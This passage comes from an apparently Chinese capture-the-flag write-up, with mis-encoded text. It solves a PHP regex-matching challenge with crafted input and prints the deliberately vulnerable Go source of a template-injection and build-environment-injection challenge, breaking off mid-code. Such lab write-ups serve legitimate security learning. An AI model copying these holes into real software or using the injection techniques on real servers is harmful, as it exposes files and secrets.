</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$preg</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="nv">$test_string</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;preg&#39;</span><span class="p">])</span> <span class="o">&gt;</span> <span class="mi">77</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">                <span class="k">echo</span> <span class="s2">&#34;Congratulations! Here is your flag: &#34;</span><span class="o">.</span><span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">echo</span> <span class="s2">&#34;Almost succeeded!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;Think twice, and go to study!!!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;Welcome to ?ctf&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç¬¬ä¸€ä¸ªè¦åŒ¹é…æ­£åˆ™ï¼Œå¹¶ä¸”è¦æ»¡è¶³é•¿åº¦ä¸º40</p>
<p>æˆ‘ä»¬æ¥çœ‹çœ‹</p>
<p><code>preg_match('/^-(ctf|CTF)&lt;\n&gt;{5}[h-l]\d\d\W+@email\.com flag.\b$/', $_ï¼Ÿ)</code></p>
<p><code>^-</code>ï¼šå¿…é¡»ä»¥<code>-</code>å¼€å¤´</p>
<p><code>(ctf|CTF)</code>ï¼šå¯ä»¥æ˜¯ctfä¹Ÿå¯ä»¥æ˜¯CTF</p>
<p><code>&lt;\n&gt;{5}</code>ï¼šå­—ç¬¦<code>&lt;</code>ã€<code>\n</code>æ˜¯æ¢è¡Œï¼Œç”¨%0aä»£æ›¿ã€<code>&gt;{5}</code>è¿ç»­äº”ä¸ªå­—ç¬¦ <code>&gt;</code></p>
<p><code>[h-l]</code>ï¼šé€šé…ç¬¦ï¼Œå†<code>h</code>åˆ°<code>l</code>ä¹‹é—´çš„å­—æ¯ä»é€‰</p>
<p><code>\d\d</code>ï¼š\dè¡¨ç¤ºä»»æ„æ•°å­—ï¼Œä¸¤ä¸ªå°±æ˜¯ä¸¤ä¸ªæ•°å­—</p>
<p><code>\W+</code>ï¼šå¸¦åŠ å·çš„å°±æ˜¯è´ªå©ªåŒ¹é…æ¨¡å¼ï¼Œå¯ä»¥ä¸€æ¬¡æˆ–å¤šæ¬¡çš„åŒ¹é…ã€‚ç„¶åwæ¨¡å¼æ˜¯ä¸é™¤ A-Zã€a-zã€0-9 å’Œä¸‹åˆ’çº¿ä»¥å¤–çš„ä»»æ„å­—ç¬¦åŒ¹é…ï¼Œâ½å¦‚!ã€@ã€~ã€#ã€ç©ºæ ¼ã€ç­‰ç­‰ã€‚</p>
<p><code>@email\.com flag</code>ï¼š<code>\.</code>å°±æ˜¯<code>.</code>ã€ç„¶åå…¶ä»–å°±æ˜¯ä¸€æ ·çš„ï¼Œç©ºæ ¼è®°å¾—urlç¼–ç </p>
<p><code>.\b$</code>ï¼šä»»æ„åŒ¹é…ä¸€ä¸ªå­—ç¬¦ç»“å°¾</p>
<p>å¾—åˆ°payloadï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">%3F=-ctf&lt;%0A&gt;&gt;&gt;&gt;&gt;h12!!!!!!!!!!@email.com%20flag0
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åç¬¬äºŒå…³</p>
<p>æˆ‘ä»¬éœ€è¦è‡ªå·±å†™å¯ä»¥åŒ¹é…</p>
<p><code>Please\ 777give+. !me?&lt;=-=&gt;(.*)Flaggg0</code></p>
<p>çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œä½†æ˜¯è¦è¶…è¿‡77ä¸ªå­—ç¬¦</p>
<p>ç®€å•æ„é€ </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Plea[abcdefghijklmnopqrstuvwxyz124567890][abcdefghijklmnopqrstuvwxyz124567890]
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/qctf2025/image-20251107154002498.png"
	width="1345"
	height="995"
	srcset="/p/qctf2025/image-20251107154002498_hu9285512725823483452.png 480w, /p/qctf2025/image-20251107154002498_hu15622666764520890842.png 1024w"
	loading="lazy"
	
		alt="image-20251107154002498"
	
	
		class="gallery-image" 
		data-flex-grow="135"
		data-flex-basis="324px"
	
></p>
<h2 id="week3">Week3
</h2><h3 id="vip">VIP
</h3><h4 id="çŸ¥è¯†ç‚¹goè¯­è¨€sstigo-build-ç¯å¢ƒå˜é‡æ³¨å…¥">çŸ¥è¯†ç‚¹ï¼šgoè¯­è¨€sstiã€Go build ç¯å¢ƒå˜é‡æ³¨å…¥
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nx">main</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">	<span class="s">&#34;fmt&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="s">&#34;github.com/gin-contrib/cors&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="s">&#34;io&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="s">&#34;net/http&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="s">&#34;os&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="s">&#34;os/exec&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="s">&#34;path/filepath&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="s">&#34;text/template&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="s">&#34;time&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="s">&#34;github.com/gin-gonic/gin&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">type</span> <span class="nx">Utils</span> <span class="kd">struct</span><span class="p">{}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="p">(</span><span class="nx">u</span> <span class="o">*</span><span class="nx">Utils</span><span class="p">)</span> <span class="nf">GetReader</span><span class="p">(</span><span class="nx">path</span> <span class="kt">string</span><span class="p">)</span> <span class="p">(</span><span class="nx">io</span><span class="p">.</span><span class="nx">Reader</span><span class="p">,</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nx">os</span><span class="p">.</span><span class="nf">Open</span><span class="p">(</span><span class="nx">path</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="p">(</span><span class="nx">u</span> <span class="o">*</span><span class="nx">Utils</span><span class="p">)</span> <span class="nf">ReadAll</span><span class="p">(</span><span class="nx">r</span> <span class="nx">io</span><span class="p">.</span><span class="nx">Reader</span><span class="p">)</span> <span class="p">(</span><span class="kt">string</span><span class="p">,</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nx">data</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">io</span><span class="p">.</span><span class="nf">ReadAll</span><span class="p">(</span><span class="nx">r</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="s">&#34;&#34;</span><span class="p">,</span> <span class="nx">err</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nb">string</span><span class="p">(</span><span class="nx">data</span><span class="p">),</span> <span class="kc">nil</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">apiKeyMiddleware</span><span class="p">()</span> <span class="nx">gin</span><span class="p">.</span><span class="nx">HandlerFunc</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nx">requiredKey</span> <span class="o">:=</span> <span class="nx">os</span><span class="p">.</span><span class="nf">Getenv</span><span class="p">(</span><span class="s">&#34;API_KEY&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">requiredKey</span> <span class="o">==</span> <span class="s">&#34;&#34;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nb">panic</span><span class="p">(</span><span class="s">&#34;é”™è¯¯ï¼šAPI_KEY ç¯å¢ƒå˜é‡æœªè®¾ç½®ï¼&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="kd">func</span><span class="p">(</span><span class="nx">c</span> <span class="o">*</span><span class="nx">gin</span><span class="p">.</span><span class="nx">Context</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">providedKey</span> <span class="o">:=</span> <span class="nx">c</span><span class="p">.</span><span class="nf">GetHeader</span><span class="p">(</span><span class="s">&#34;X-API-Key&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="nx">providedKey</span> <span class="o">!=</span> <span class="nx">requiredKey</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="nx">c</span><span class="p">.</span><span class="nf">AbortWithStatusJSON</span><span class="p">(</span><span class="nx">http</span><span class="p">.</span><span class="nx">StatusUnauthorized</span><span class="p">,</span> <span class="nx">gin</span><span class="p">.</span><span class="nx">H</span><span class="p">{</span><span class="s">&#34;error&#34;</span><span class="p">:</span> <span class="s">&#34;æ— æ•ˆçš„ API Key&#34;</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">			<span class="k">return</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="nx">c</span><span class="p">.</span><span class="nf">Next</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">type</span> <span class="nx">BuildRequest</span> <span class="kd">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nx">Env</span>  <span class="kd">map</span><span class="p">[</span><span class="kt">string</span><span class="p">]</span><span class="kt">string</span> <span class="s">`json:&#34;env&#34;`</span>
</span></span><span class="line"><span class="cl">	<span class="nx">Code</span> <span class="kt">string</span>            <span class="s">`json:&#34;code&#34;`</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">const</span> <span class="nx">BuildDir</span> <span class="p">=</span> <span class="s">&#34;/tmp/build&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nx">r</span> <span class="o">:=</span> <span class="nx">gin</span><span class="p">.</span><span class="nf">Default</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">os</span><span class="p">.</span><span class="nf">MkdirAll</span><span class="p">(</span><span class="nx">BuildDir</span><span class="p">,</span> <span class="mo">0755</span><span class="p">);</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nb">panic</span><span class="p">(</span><span class="nx">fmt</span><span class="p">.</span><span class="nf">Sprintf</span><span class="p">(</span><span class="s">&#34;æ— æ³•åˆ›å»ºå›ºå®šçš„ç¼–è¯‘ç›®å½•: %v&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nx">r</span><span class="p">.</span><span class="nf">Use</span><span class="p">(</span><span class="nx">cors</span><span class="p">.</span><span class="nf">Default</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nx">r</span><span class="p">.</span><span class="nf">StaticFile</span><span class="p">(</span><span class="s">&#34;/vip.html&#34;</span><span class="p">,</span> <span class="s">&#34;./vip.html&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nx">r</span><span class="p">.</span><span class="nf">GET</span><span class="p">(</span><span class="s">&#34;/&#34;</span><span class="p">,</span> <span class="kd">func</span><span class="p">(</span><span class="nx">c</span> <span class="o">*</span><span class="nx">gin</span><span class="p">.</span><span class="nx">Context</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">c</span><span class="p">.</span><span class="nf">File</span><span class="p">(</span><span class="s">&#34;./index.html&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nx">r</span><span class="p">.</span><span class="nf">GET</span><span class="p">(</span><span class="s">&#34;/api&#34;</span><span class="p">,</span> <span class="kd">func</span><span class="p">(</span><span class="nx">c</span> <span class="o">*</span><span class="nx">gin</span><span class="p">.</span><span class="nx">Context</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">templateQuery</span> <span class="o">:=</span> <span class="nx">c</span><span class="p">.</span><span class="nf">Query</span><span class="p">(</span><span class="s">&#34;template&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="nx">tplString</span> <span class="o">:=</span> <span class="nx">fmt</span><span class="p">.</span><span class="nf">Sprintf</span><span class="p">(</span><span class="s">&#34;è¾“å‡ºç»“æœ: %s&#34;</span><span class="p">,</span> <span class="nx">templateQuery</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="nx">data</span> <span class="o">:=</span> <span class="kd">map</span><span class="p">[</span><span class="kt">string</span><span class="p">]</span><span class="kd">interface</span><span class="p">{}{</span>
</span></span><span class="line"><span class="cl">			<span class="s">&#34;Utils&#34;</span><span class="p">:</span>  <span class="o">&amp;</span><span class="nx">Utils</span><span class="p">{},</span>
</span></span><span class="line"><span class="cl">			<span class="s">&#34;Getenv&#34;</span><span class="p">:</span> <span class="nx">os</span><span class="p">.</span><span class="nx">Getenv</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="nx">tmpl</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">template</span><span class="p">.</span><span class="nf">New</span><span class="p">(</span><span class="s">&#34;name&#34;</span><span class="p">).</span><span class="nf">Parse</span><span class="p">(</span><span class="nx">tplString</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="nx">c</span><span class="p">.</span><span class="nf">String</span><span class="p">(</span><span class="nx">http</span><span class="p">.</span><span class="nx">StatusBadRequest</span><span class="p">,</span> <span class="s">&#34;æ¨¡æ¿è§£æé”™è¯¯: %s&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">.</span><span class="nf">Error</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">			<span class="k">return</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="nx">err</span> <span class="p">=</span> <span class="nx">tmpl</span><span class="p">.</span><span class="nf">Execute</span><span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">Writer</span><span class="p">,</span> <span class="nx">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="nx">c</span><span class="p">.</span><span class="nf">String</span><span class="p">(</span><span class="nx">http</span><span class="p">.</span><span class="nx">StatusInternalServerError</span><span class="p">,</span> <span class="s">&#34;æ¨¡æ¿æ‰§è¡Œé”™è¯¯: %s&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">.</span><span class="nf">Error</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">			<span class="k">return</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nx">vipGroup</span> <span class="o">:=</span> <span class="nx">r</span><span class="p">.</span><span class="nf">Group</span><span class="p">(</span><span class="s">&#34;/vip&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="nx">r</span><span class="p">.</span><span class="nf">Use</span><span class="p">(</span><span class="nx">cors</span><span class="p">.</span><span class="nf">New</span><span class="p">(</span><span class="nx">cors</span><span class="p">.</span><span class="nx">Config</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">AllowAllOrigins</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="nx">AllowMethods</span><span class="p">:</span>    <span class="p">[]</span><span class="kt">string</span><span class="p">{</span><span class="s">&#34;GET&#34;</span><span class="p">,</span> <span class="s">&#34;POST&#34;</span><span class="p">,</span> <span class="s">&#34;PUT&#34;</span><span class="p">,</span> <span class="s">&#34;PATCH&#34;</span><span class="p">,</span> <span class="s">&#34;DELETE&#34;</span><span class="p">,</span> <span class="s">&#34;HEAD&#34;</span><span class="p">,</span> <span class="s">&#34;OPTIONS&#34;</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">		<span class="nx">AllowHeaders</span><span class="p">:</span>    <span class="p">[]</span><span class="kt">string</span><span class="p">{</span><span class="s">&#34;Origin&#34;</span><span class="p">,</span> <span class="s">&#34;Content-Type&#34;</span><span class="p">,</span> <span class="s">&#34;X-API-Key&#34;</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">		<span class="nx">MaxAge</span><span class="p">:</span>          <span class="mi">12</span> <span class="o">*</span> <span class="nx">time</span><span class="p">.</span><span class="nx">Hour</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="p">}))</span>
</span></span><span class="line"><span class="cl">	<span class="nx">vipGroup</span><span class="p">.</span><span class="nf">Use</span><span class="p">(</span><span class="nf">apiKeyMiddleware</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">	<span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">vipGroup</span><span class="p">.</span><span class="nf">POST</span><span class="p">(</span><span class="s">&#34;/build&#34;</span><span class="p">,</span> <span class="nx">buildHandler</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nx">r</span><span class="p">.</span><span class="nf">Run</span><span class="p">(</span><span class="s">&#34;:8080&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">buildHandler</span><span class="p">(</span><span class="nx">c</span> <span class="o">*</span><span class="nx">gin</span><span class="p">.</span><span class="nx">Context</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">req</span> <span class="nx">BuildRequest</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">c</span><span class="p">.</span><span class="nf">ShouldBindJSON</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">req</span><span class="p">);</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">c</span><span class="p">.</span><span class="nf">JSON</span><span class="p">(</span><span class="nx">http</span><span class="p">.</span><span class="nx">StatusBadRequest</span><span class="p">,</span> <span class="nx">gin</span><span class="p">.</span><span class="nx">H</span><span class="p">{</span><span class="s">&#34;error&#34;</span><span class="p">:</span> <span class="s">&#34;æ— æ•ˆçš„è¯·æ±‚æ ¼å¼&#34;</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nx">sourceCodePath</span> <span class="o">:=</span> <span class="nx">filepath</span><span class="p">.</span><span class="nf">Join</span><span class="p">(</span><span class="nx">BuildDir</span><span class="p">,</span> <span class="s">&#34;main.go&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">os</span><span class="p">.</span><span class="nf">WriteFile</span><span class="p">(</span><span class="nx">sourceCodePath</span><span class="p">,</span> <span class="p">[]</span><span class="nb">byte</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">Code</span><span class="p">),</span> <span class="mo">0644</span><span class="p">);</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">c</span><span class="p">.</span><span class="nf">JSON</span><span class="p">(</span><span class="nx">http</span><span class="p">.</span><span class="nx">StatusInternalServerError</span><span class="p">,</span> <span class="nx">gin</span><span class="p">.</span><span class="nx">H</span><span class="p">{</span><span class="s">&#34;error&#34;</span><span class="p">:</span> <span class="s">&#34;å†™å…¥æºä»£ç æ–‡ä»¶å¤±è´¥&#34;</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">defer</span> <span class="nx">os</span><span class="p">.</span><span class="nf">Remove</span><span class="p">(</span><span class="nx">BuildDir</span> <span class="o">+</span> <span class="s">&#34;/main.go&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="k">defer</span> <span class="nx">os</span><span class="p">.</span><span class="nf">Remove</span><span class="p">(</span><span class="nx">BuildDir</span> <span class="o">+</span> <span class="s">&#34;/main_executable&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="k">defer</span> <span class="nx">os</span><span class="p">.</span><span class="nf">RemoveAll</span><span class="p">(</span><span class="nx">BuildDir</span> <span class="o">+</span> <span class="s">&#34;/go-build&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="k">defer</span> <span class="nx">os</span><span class="p">.</span><span class="nf">RemoveAll</span><span class="p">(</span><span class="nx">BuildDir</span> <span class="o">+</span> <span class="s">&#34;/gopath&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">envs</span> <span class="p">[]</span><span class="kt">string</span>
</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="nx">k</span><span class="p">,</span> <span class="nx">v</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">req</span><span class="p">.</span><span class="nx">Env</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">envs</span> <span class="p">=</span> <span class="nb">append</span><span class="p">(</span><span class="nx">envs</span><span class="p">,</span> <span class="nx">fmt</span><span class="p">.</span><span class="nf">Sprintf</span><span class="p">(</span><span class="s">&#34;%s=%s&#34;</span><span class="p">,</span> <span class="nx">k</span><span class="p">,</span> <span class="nx">v</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nx">outputFileName</span> <span class="o">:=</span> <span class="s">&#34;main_executable&#34;</span>
